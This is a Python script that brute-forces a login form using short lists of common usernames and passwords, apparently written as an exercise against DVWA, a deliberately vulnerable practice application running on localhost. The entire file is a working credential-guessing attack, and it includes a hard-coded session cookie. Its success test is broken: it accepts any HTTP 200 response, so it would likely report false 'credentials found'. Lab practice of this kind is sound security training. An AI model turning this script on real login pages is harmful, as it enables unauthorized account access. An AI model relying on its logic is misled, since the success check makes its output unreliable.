import requests

# Adjust the URL to point to the login page of DVWA
login_url = 'http://127.0.0.1/login.php'

# Replace with your actual session cookies from DVWA
cookies = {
    'PHPSESSID': "b0rbtd9rml9kneq00kt0vofai6",  
    'security': 'low'  # Ensure the security level matches the one set in DVWA
}

# List of common usernames and passwords for brute force
usernames = ['admin', 'administrator', 'root', 'user', 'test']
passwords = ['password', '123456', 'admin123', 'qwerty', 'password123']

# Function to perform brute force attack
def brute_force():
    print("Performing Brute Force Attack...\n")
    for username in usernames:
        for password in passwords:
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            try:
                response = requests.post(login_url, cookies=cookies, data=data, timeout=10)

                # Check response content or status code for login success
                if 'Welcome to the password protected area admin' in response.text or response.status_code == 200:
                    print(f"Brute Force successful with username: {username} and password: {password}")
                    print(f"Credentials Found: Username - {username}, Password - {password}")
                    return  # Exit function if credentials are found

            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")

    print("Brute Force Attack completed. No valid credentials found.")

# Run brute force attack
brute_force()
